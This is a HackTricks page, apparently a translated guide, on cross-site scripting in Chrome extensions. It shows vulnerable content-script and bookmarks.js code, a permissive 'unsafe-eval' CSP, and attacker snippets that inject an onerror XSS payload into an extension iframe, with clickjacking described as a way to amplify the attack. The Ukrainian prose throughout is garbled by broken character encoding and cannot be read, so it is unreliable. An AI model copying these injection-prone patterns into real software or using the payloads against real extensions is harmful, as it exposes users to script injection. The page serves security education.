# BrowExt - XSS Example

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Cross-Site Scripting (XSS) —á–µ—Ä–µ–∑ Iframe

–£ —Ü—ñ–π –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó —Ä–µ–∞–ª—ñ–∑–æ–≤–∞–Ω–æ **–∫–æ–Ω—Ç–µ–Ω—Ç–Ω–∏–π —Å–∫—Ä–∏–ø—Ç**, —è–∫–∏–π —Å—Ç–≤–æ—Ä—é—î Iframe, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ URL –∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏ –∑–∞–ø–∏—Ç—É —è–∫ –¥–∂–µ—Ä–µ–ª–æ Iframe:
```javascript
chrome.storage.local.get("message", result => {
let constructedURL = chrome.runtime.getURL("message.html") +
"?content=" + encodeURIComponent(result.message) +
"&redirect=https://example.net/details";
frame.src = constructedURL;
});
```
–î–æ—Å—Ç—É–ø–Ω–∞ –¥–ª—è –ø—É–±–ª—ñ–∫–∏ HTML-—Å—Ç–æ—Ä—ñ–Ω–∫–∞, **`message.html`**, –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∞ –¥–ª—è –¥–∏–Ω–∞–º—ñ—á–Ω–æ–≥–æ –¥–æ–¥–∞–≤–∞–Ω–Ω—è –≤–º—ñ—Å—Ç—É –¥–æ —Ç—ñ–ª–∞ –¥–æ–∫—É–º–µ–Ω—Ç–∞ –Ω–∞ –æ—Å–Ω–æ–≤—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤ —É URL:
```javascript
$(document).ready(() => {
let urlParams = new URLSearchParams(window.location.search);
let userContent = urlParams.get("content");
$(document.body).html(`${userContent} <button id='detailBtn'>Details</button>`);
$('#detailBtn').on('click', () => {
let destinationURL = urlParams.get("redirect");
chrome.tabs.create({ url: destinationURL });
});
});
```
–ó–ª–æ–≤–º–∏—Å–Ω–∏–π —Å–∫—Ä–∏–ø—Ç –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ —Å—É–ø—Ä–æ—Ç–∏–≤–Ω–∏–∫–∞, –º–æ–¥–∏—Ñ—ñ–∫—É—é—á–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä `content` –¥–∂–µ—Ä–µ–ª–∞ Iframe, —â–æ–± –≤–≤–µ—Å—Ç–∏ **XSS payload**. –¶–µ –¥–æ—Å—è–≥–∞—î—Ç—å—Å—è —à–ª—è—Ö–æ–º –æ–Ω–æ–≤–ª–µ–Ω–Ω—è –¥–∂–µ—Ä–µ–ª–∞ Iframe, —â–æ–± –≤–∫–ª—é—á–∏—Ç–∏ —à–∫—ñ–¥–ª–∏–≤–∏–π —Å–∫—Ä–∏–ø—Ç:
```javascript
setTimeout(() => {
let targetFrame = document.querySelector("iframe").src;
let baseURL = targetFrame.split('?')[0];
let xssPayload = "<img src='invalid' onerror='alert(\"XSS\")'>";
let maliciousURL = `${baseURL}?content=${encodeURIComponent(xssPayload)}`;

document.querySelector("iframe").src = maliciousURL;
}, 1000);
```
–ó–∞–Ω–∞–¥—Ç–æ –ø–æ–±–ª–∞–∂–ª–∏–≤–∞ –ø–æ–ª—ñ—Ç–∏–∫–∞ –±–µ–∑–ø–µ–∫–∏ –∫–æ–Ω—Ç–µ–Ω—Ç—É, —Ç–∞–∫–∞ —è–∫:
```json
"content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self';"
```
–¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ–Ω–∞–Ω–Ω—è JavaScript, —â–æ —Ä–æ–±–∏—Ç—å —Å–∏—Å—Ç–µ–º—É –≤—Ä–∞–∑–ª–∏–≤–æ—é –¥–æ –∞—Ç–∞–∫ XSS.

–ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–∏–π –ø—ñ–¥—Ö—ñ–¥ –¥–ª—è –ø—Ä–æ–≤–æ–∫–∞—Ü—ñ—ó XSS –ø–æ–ª—è–≥–∞—î –≤ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—ñ –µ–ª–µ–º–µ–Ω—Ç–∞ Iframe —ñ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ñ –π–æ–≥–æ –¥–∂–µ—Ä–µ–ª–∞, —â–æ–± –≤–∫–ª—é—á–∏—Ç–∏ —à–∫—ñ–¥–ª–∏–≤–∏–π —Å–∫—Ä–∏–ø—Ç —è–∫ –ø–∞—Ä–∞–º–µ—Ç—Ä `content`:
```javascript
let newFrame = document.createElement("iframe");
newFrame.src = "chrome-extension://abcdefghijklmnopabcdefghijklmnop/message.html?content=" +
encodeURIComponent("<img src='x' onerror='alert(\"XSS\")'>");
document.body.append(newFrame);
```
## DOM-based XSS + ClickJacking

–¶–µ–π –ø—Ä–∏–∫–ª–∞–¥ –±—É–≤ –≤–∑—è—Ç–∏–π –∑ [–æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–æ–≥–æ –ø–æ—Å—Ç—É](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/).

–û—Å–Ω–æ–≤–Ω–∞ –ø—Ä–æ–±–ª–µ–º–∞ –≤–∏–Ω–∏–∫–∞—î –∑ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ Cross-site Scripting (XSS), —â–æ –±–∞–∑—É—î—Ç—å—Å—è –Ω–∞ DOM, —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–æ—ó –≤ **`/html/bookmarks.html`**. –ü—Ä–æ–±–ª–µ–º–Ω–∏–π JavaScript, —á–∞—Å—Ç–∏–Ω–∞ **`bookmarks.js`**, –¥–µ—Ç–∞–ª—å–Ω–æ –æ–ø–∏—Å–∞–Ω–∏–π –Ω–∏–∂—á–µ:
```javascript
$('#btAdd').on('click', function() {
var bookmarkName = $('#txtName').val();
if ($('.custom-button .label').filter(function() {
return $(this).text() === bookmarkName;
}).length) return false;

var bookmarkItem = $('<div class="custom-button">');
bookmarkItem.html('<span class="label">' + bookmarkName + '</span>');
bookmarkItem.append('<button class="remove-btn" title="delete">x</button>');
bookmarkItem.attr('data-title', bookmarkName);
bookmarkItem.data('timestamp', (new Date().getTime()));
$('section.bookmark-container .existing-items').append(bookmarkItem);
persistData();
});
```
–¶–µ–π —Ñ—Ä–∞–≥–º–µ–Ω—Ç –æ—Ç—Ä–∏–º—É—î **–∑–Ω–∞—á–µ–Ω–Ω—è** –∑ –ø–æ–ª—è –≤–≤–µ–¥–µ–Ω–Ω—è **`txtName`** —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î **–∫–æ–Ω–∫–∞—Ç–µ–Ω–∞—Ü—ñ—é —Ä—è–¥–∫—ñ–≤ –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó HTML**, —è–∫–∏–π –ø–æ—Ç—ñ–º –¥–æ–¥–∞—î—Ç—å—Å—è –¥–æ DOM –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ñ—É–Ω–∫—Ü—ñ—ó `.append()` jQuery.

–ó–∞–∑–≤–∏—á–∞–π, –ü–æ–ª—ñ—Ç–∏–∫–∞ –ë–µ–∑–ø–µ–∫–∏ –ö–æ–Ω—Ç–µ–Ω—Ç—É (CSP) —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è Chrome –∑–∞–ø–æ–±—ñ–≥–∞–ª–∞ –± —Ç–∞–∫–∏–º –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—è–º. –û–¥–Ω–∞–∫, —á–µ—Ä–µ–∑ **–ø–æ—Å–ª–∞–±–ª–µ–Ω–Ω—è CSP –∑ ‚Äòunsafe-eval‚Äô** —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –º–µ—Ç–æ–¥—ñ–≤ –º–∞–Ω—ñ–ø—É–ª—è—Ü—ñ—ó DOM jQuery (—è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å [`globalEval()`](https://api.jquery.com/jquery.globaleval/) –¥–ª—è –ø–µ—Ä–µ–¥–∞—á—ñ —Å–∫—Ä–∏–ø—Ç—ñ–≤ –¥–æ [`eval()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) –ø—ñ–¥ —á–∞—Å –≤—Å—Ç–∞–≤–∫–∏ –≤ DOM), –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –≤—Å–µ —â–µ –º–æ–∂–ª–∏–≤–∞.

–•–æ—á–∞ —Ü—è –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å —î –∑–Ω–∞—á–Ω–æ—é, —ó—ó –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –∑–∞–∑–≤–∏—á–∞–π –∑–∞–ª–µ–∂–∏—Ç—å –≤—ñ–¥ –≤–∑–∞—î–º–æ–¥—ñ—ó –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞: –≤—ñ–¥–≤—ñ–¥—É–≤–∞–Ω–Ω—è —Å—Ç–æ—Ä—ñ–Ω–∫–∏, –≤–≤–µ–¥–µ–Ω–Ω—è XSS-–ø–µ–π–ª–æ–∞–¥–∞ —Ç–∞ –∞–∫—Ç–∏–≤–∞—Ü—ñ—è –∫–Ω–æ–ø–∫–∏ ‚Äú–î–æ–¥–∞—Ç–∏‚Äù.

–©–æ–± –ø–æ—Å–∏–ª–∏—Ç–∏ —Ü—é –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å, –µ–∫—Å–ø–ª—É–∞—Ç—É—î—Ç—å—Å—è –≤—Ç–æ—Ä–∏–Ω–Ω–∞ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å **clickjacking**. –ú–∞–Ω—ñ—Ñ–µ—Å—Ç —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è Chrome –¥–µ–º–æ–Ω—Å—Ç—Ä—É—î —Ä–æ–∑—à–∏—Ä–µ–Ω—É –ø–æ–ª—ñ—Ç–∏–∫—É `web_accessible_resources`:
```json
"web_accessible_resources": [
"html/bookmarks.html",
"dist/*",
"assets/*",
"font/*",
[...]
],
```
–ó–æ–∫—Ä–µ–º–∞, —Å—Ç–æ—Ä—ñ–Ω–∫–∞ **`/html/bookmarks.html`** –ø—ñ–¥–ª—è–≥–∞—î —Ñ—Ä–µ–π–º—ñ–Ω–≥—É, –æ—Ç–∂–µ, –≤—Ä–∞–∑–ª–∏–≤–∞ –¥–æ **clickjacking**. –¶—è –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è —Ñ—Ä–µ–π–º—ñ–Ω–≥—É —Å—Ç–æ—Ä—ñ–Ω–∫–∏ –≤ –º–µ–∂–∞—Ö —Å–∞–π—Ç—É –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞, –Ω–∞–∫–ª–∞–¥–∞—é—á–∏ –Ω–∞ –Ω–µ—ó –µ–ª–µ–º–µ–Ω—Ç–∏ DOM –¥–ª—è –æ–±–º–∞–Ω–Ω–æ–≥–æ redesign —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—É. –¶–µ –º–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ —Ç–æ–≥–æ, —â–æ –∂–µ—Ä—Ç–≤–∏ –Ω–µ–Ω–∞–≤–º–∏—Å–Ω–æ –≤–∑–∞—î–º–æ–¥—ñ—é—Ç—å –∑ –æ—Å–Ω–æ–≤–Ω–∏–º —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è–º.

## References

* [https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/](https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/)
* [https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
